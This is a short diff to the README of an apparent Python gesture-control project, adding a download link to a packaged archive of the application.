@@ -16,6 +16,8 @@
   > - screenshot
   > - Hold left arrow
   > - Hold right arrow
+
+- You can download our application here [GCC](https://www.mediafire.com/file/f7cpxka5fhjlcrz/Gesture-Control-Computer.rar/file)
 # Tech Stack
 - Python
 - Python modules
